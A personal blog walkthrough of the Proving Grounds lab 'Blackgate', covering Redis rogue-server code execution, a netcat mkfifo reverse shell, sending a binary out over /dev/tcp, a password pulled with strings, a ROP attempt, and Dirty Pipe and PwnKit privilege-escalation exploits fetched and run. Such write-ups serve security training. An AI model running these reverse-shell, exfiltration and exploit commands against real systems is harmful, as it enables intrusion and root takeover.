---
title: Blackgate
date: 2026-05-07T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - proving-grounds
  - linpeas
  - git
  - redis
  - searchsploit
  - ghidra
  - pwndbg
  - ROPgadget
categories:
  - Pentesting
  - Offsec
  - Linux
description: "This guide provides readers with the solution to the Proving Grounds Lab: Blackgate"
---
Just because we have the best hammer does not mean that every problem is a nail.  
-Barack Obama

This one has a deep rabbit hole to fall into regarding Return Orientated Programming. 
 
![](Screenshot%202026-04-30%20at%2015.01.27.png)

![](Screenshot%202026-04-30%20at%2015.02.06.png)

...

![](Screenshot%202026-04-30%20at%2015.14.13.png)

Port: 6379

After a few searches and failed attempts I founds this:  
https://github.com/n0b0dyCN/redis-rogue-server

./redis-rogue-server.py --rhost=192.168.236.176 --lhost=192.168.45.234  --exp=exp.so 

![](Screenshot%202026-04-30%20at%2017.04.16.png)

![](Screenshot%202026-04-30%20at%2017.03.43.png)

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

![](Screenshot%202026-05-01%20at%2007.38.58.png)

OR: Interactive

www.revshells.com

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.204 1337 >/tmp/f`

![](Screenshot%202026-05-05%20at%2016.10.07.png)

![](Screenshot%202026-05-05%20at%2016.10.32.png)

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

`export TERM=xterm`

![](Screenshot%202026-05-05%20at%2016.11.05.png)

`sudo -l`

![](Screenshot%202026-05-07%20at%2007.53.58.png)

Lets get that redis-status binary.

Kali: `rlwrap nc -lvnp 443 > redis-status`

Victim: `cat /usr/local/bin/redis-status > /dev/tcp/192.168.45.204/443`

![](Screenshot%202026-05-05%20at%2016.16.38.png)

![](Screenshot%202026-05-05%20at%2016.17.33.png)

Open in Ghidra

![](Screenshot%202026-05-01%20at%2008.09.28.png)

Or strings:  
`strings redis-status`

![](Screenshot%202026-05-05%20at%2016.18.52.png)

`ClimbingParrotKickingDonkey321`

![](Screenshot%202026-05-01%20at%2008.02.08.png)

This is where I went down a 3 day rabbit hole leaning about Return Orientated Programming/binary exploitation.

All I needed to do was add functionality to my reverse shell to get root. I don't yet fully understand by looking at the binary what is happening. 

When I ran the binary without using 'export TERM=xterm' the binary would finish as normal as seen above. Once this have been invoked then I was able to input commands.

![](Screenshot%202026-05-04%20at%2021.05.36.png)

I think this stems from an out of date sudo version. 


There was a buffer overflow vulnerability too...

And this machine is vulnerable to polkit:  
https://nvd.nist.gov/vuln/detail/cve-2021-4034

......

![](Screenshot%202026-05-05%20at%2009.26.41.png)

I might try to create a ROP exploit in python using what I've just learnt. This will probably fail but it'll get closer to understanding assembly and the stack. 

https://www.youtube.com/watch?v=8zRoMAkGYQE

According to this video I will need to chain together memory addresses into my payload.
- pop_rdi_ret address
- system function address
- string(/bin/sh) address

ROPgadget --binary ./redis-status 
![](Screenshot%202026-05-07%20at%2015.49.17.png)

![](Screenshot%202026-05-05%20at%2009.29.52.png)
![](Screenshot%202026-05-05%20at%2013.43.38.png)

First draft:

![](Screenshot%202026-05-05%20at%2013.36.44.png)

I don't have a memory address with the correct string. Ideally /bin/sh, currently 0x0 will be used via the command_add memory address. 

I could hijack the binary further to prompt an user input but that would require much more research and I need to continue with the oscp study. 


This will also get you root...

https://github.com/h3x0v3rl0rd/CVE-2021-4034_Python3/blob/main/cve-2021-4034.py

![](Screenshot%202026-05-07%20at%2008.56.55.png)

![](Screenshot%202026-05-07%20at%2015.21.51.png)

I tried Polkit but didn't get it working. 

![](Screenshot%202026-05-07%20at%2008.59.15.png)

Maybe I'll also have a go at OverlayFS 😈

![](Screenshot%202026-05-07%20at%2008.59.55.png)

OverlayFS; Failed
eBPF ALU32; Failed
Dirty Pipe; 🐚

This confirmed that it was vulnerable:  
 https://github.com/basharkey/CVE-2022-0847-dirty-pipe-checker

I cloned this repo:
https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits

Zipped it and moved the whole folder onto the machine.

![](Screenshot%202026-05-07%20at%2014.15.19.png)

`wget -r http://192.16845.198/move.zip`

![](Screenshot%202026-05-07%20at%2014.17.40.png)

`unzip move`

Move into the unzipped folder and compile the executable using the script. 
```
chmod 777 *
./compile.sh
./exploit-1
```

![](Screenshot%202026-05-07%20at%2013.42.38.png)

If you made it this far, my apologies. I dove deep on this one. 


“What use are the best of arguments when they can be destroyed by force?”  
― Jules Verne, Twenty Thousand Leagues Under the Sea

I thought I was done. Then I tried pwnkit again:  
`git clone https://github.com/ly4k/PwnKit.git`  
`chmod 777 *  
`./PwnKit.sh`

![](Screenshot%202026-05-07%20at%2014.44.36.png)


'People who say "it is impossible", should not interrupt those who are trying to make it possible.'  
― Arnold Schwarzenegger